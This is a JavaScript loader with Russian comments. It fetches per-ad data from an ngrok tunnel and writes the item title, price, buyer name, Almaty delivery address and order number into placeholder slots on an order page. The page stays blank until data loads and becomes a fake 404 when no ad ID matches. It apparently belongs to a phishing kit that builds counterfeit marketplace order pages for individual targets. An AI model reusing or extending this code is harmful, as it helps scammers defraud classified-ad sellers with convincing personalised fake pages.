/**
 * Загрузчик данных объявления
 * Загружает данные объявления с сервера и обновляет страницу
 */

(function() {
  'use strict';

  /**
   * Получает ID объявления из URL
   */
  function getAdIdFromUrl() {
    // Сначала пробуем из pathname (например, /AD1234567)
    var pathMatch = window.location.pathname.match(/\/(AD\d{7})/);
    if (pathMatch) {
      console.log('Ad ID найден в pathname:', pathMatch[1]);
      return pathMatch[1];
    }
    
    // Затем из параметров URL
    var params = new URLSearchParams(window.location.search);
    var adId = params.get('adId');
    if (adId) {
      console.log('Ad ID найден в параметрах:', adId);
      return adId;
    }
    
    // Если ничего не найдено, возвращаем null
    console.warn('Ad ID не найден в URL');
    return null;
  }

  /**
   * Форматирует число с разделителями
   */
  function formatMoney(amount) {
    return String(amount).replace(/\B(?=(\d{3})+(?!\d))/g, " ");
  }

  /**
   * Применяет данные объявления к DOM
   */
  function applyAdData(adId, ad) {
    // Обновляем заголовок страницы
    document.title = ad.title + ' - ' + ad.price + ' ' + ad.currency;

    // Обновляем h1 с названием
    var h1 = document.querySelector('.desktop-panel h1');
    if (h1) {
      h1.textContent = ad.title;
    }

    // Обновляем все элементы с ценой
    var priceElements = document.querySelectorAll('[data-format-money]');
    priceElements.forEach(function(element) {
      var formattedPrice = formatMoney(ad.price);
      element.textContent = formattedPrice + ' ' + ad.currency;
    });

    // Обновляем адрес доставки
    var addressElements = document.querySelectorAll('.order-item p, .m-item p, .details-grid div, .mobile-order-box p');
    addressElements.forEach(function(element) {
      var text = element.innerHTML;
      if (text.includes('г. Алматы, ул. Байзакова')) {
        element.innerHTML = text.replace(/г\. Алматы, ул\. Байзакова[^<]*/g, ad.address);
      }
    });

    // Обновляем номер заказа
    var orderElements = document.querySelectorAll('.details-grid div, .mobile-order-box p');
    orderElements.forEach(function(element) {
      var text = element.innerHTML;
      if (text.includes('#6754469669')) {
        element.innerHTML = text.replace(/#6754469669/g, '#' + ad.id);
      }
    });

    // Обновляем название товара (fdgdfg)
    var titleElements = document.querySelectorAll('.order-item p, .m-item p');
    titleElements.forEach(function(element) {
      var text = element.innerHTML;
      if (text.includes('fdgdfg')) {
        element.innerHTML = text.replace(/fdgdfg/g, ad.fio || ad.title);
      }
    });

    // Сохраняем данные в window
    window.__currentAdData = {
      itemId: adId,
      price: ad.price,
      curr: ad.currency,
      title: ad.title,
      fio: ad.fio,
      address: ad.address
    };

    window.adId = adId;
    window.itemId = adId;
  }

  var WEBHOOK_URL = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';

  /**
   * Загружает и отображает данные объявления с ретраями
   */
  function loadAndDisplayAd() {
    var adId = getAdIdFromUrl();
    if (!adId) {
      console.log('No ad ID found in URL');
      return;
    }

    var maxRetries = 3;
    var retryDelay = 1000;
    var attempt = 0;

    function tryFetch() {
      attempt++;

      var urls = [
        WEBHOOK_URL + '/api/ad/' + adId,
        '/api/ad/' + adId
      ];

      function fetchNext(idx) {
        if (idx >= urls.length) {
          if (attempt < maxRetries) {
            setTimeout(tryFetch, retryDelay);
          } else {
            document.title = 'Not Found';
            document.body.style.display = '';
            document.body.innerHTML = '' +
              '<style>' +
              '*{margin:0;padding:0;box-sizing:border-box}' +
              'body{font-family:system-ui,-apple-system,sans-serif;background:#f5f4f2;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#0f0f0f}' +
              '.nf-container{text-align:center}' +
              'h1{font-size:72px;font-weight:700;margin-bottom:8px}' +
              'p{font-size:20px;color:#666}' +
              '</style>' +
              '<div class="nf-container"><h1>404</h1><p>Not Found</p></div>';
          }
          return;
        }

        console.log('Loading ad data from:', urls[idx], '(attempt', attempt + '/' + maxRetries + ')');

        fetch(urls[idx], { headers: { 'ngrok-skip-browser-warning': 'true' } })
          .then(function(resp) {
            if (!resp.ok) throw new Error('Failed: ' + resp.status);
            return resp.json();
          })
          .then(function(data) {
            if (!data.ok || !data.ad) throw new Error('Invalid ad data');
            applyAdData(adId, data.ad);
            document.body.style.display = '';
          })
          .catch(function() {
            fetchNext(idx + 1);
          });
      }

      fetchNext(0);
    }

    tryFetch();
  }

  // Загружаем данные при загрузке документа (один раз)
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', loadAndDisplayAd);
  } else {
    loadAndDisplayAd();
  }

  // Экспортируем функции
  window.AdLoader = {
    getAdIdFromUrl: getAdIdFromUrl,
    loadAndDisplayAd: loadAndDisplayAd
  };
})();
